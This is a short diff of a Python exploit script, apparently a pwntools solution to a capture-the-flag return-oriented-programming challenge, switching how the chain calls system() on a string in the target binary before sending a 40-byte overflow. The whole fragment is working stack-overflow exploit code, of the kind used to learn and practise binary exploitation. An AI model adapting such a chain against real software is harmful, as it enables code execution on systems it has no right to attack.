@@ -10,7 +10,7 @@ def exploit(pad: bool = False) -> str:
     p = process()
     if pad:
         r.call(r.ret)
-    r.call("system", [e.symbols["usefulString"]])
+    r.system(e.symbols["usefulString"])
     log.info(f"chain:\n{r.dump()}")
     p.send(b"A" * 8 * 5 + r.chain())
     return p.recvline_regex(rb".*{.*}.*").decode("ascii")
